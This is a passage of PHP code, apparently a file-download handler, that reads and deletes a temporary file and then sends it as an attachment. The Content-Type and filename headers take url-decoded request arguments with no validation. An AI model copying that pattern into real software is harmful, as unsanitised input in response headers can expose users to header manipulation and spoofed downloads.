 51             $fh = fopen($file, 'r') or die('Unable to load file, something bad has happened.') ;
 52
 53             while (!feof($fh))
 54                 $txt .= fread($fh, 1024) ;
 55
 56             //  Clean up the temporary file - permissions
 57             //  may prevent this from succeedeing so use the '@'
 58             //  to suppress any messages from PHP.
 59
 60             @unlink($file) ;
 61         }
 62
 63         $filename = urldecode($args['filename']) ;
 64         $contenttype = urldecode($args['contenttype']) ;
 65
 66         // Tell browser to expect a text file of some sort (usually txt or csv)
 67
 68         header(sprintf('Content-Type: application/%s', $contenttype)) ;
 69         header(sprintf('Content-disposition:  attachment; filename=%s', $filename)) ;
